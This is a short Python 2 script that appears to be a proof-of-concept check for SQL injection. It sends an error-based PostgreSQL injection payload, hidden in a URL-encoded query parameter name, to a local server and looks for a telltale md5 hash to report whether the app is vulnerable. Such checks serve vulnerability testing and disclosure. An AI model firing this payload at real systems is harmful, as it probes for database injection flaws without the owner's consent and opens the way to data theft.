import requests

if __name__ == '__main__':
    res = requests.get("http://127.0.0.1:8000/select?info__test%27+%3d+%27%22a%22%27)%20and%207778%3dCAST((SELECT%20md5(%273.1314%27))::text%20AS%20NUMERIC)--")
    if '61af510329335d3ff7b7b4fdda3d9242' in res.text:
        print 'Vulnerability!'
    else:
        print 'No vulnerability'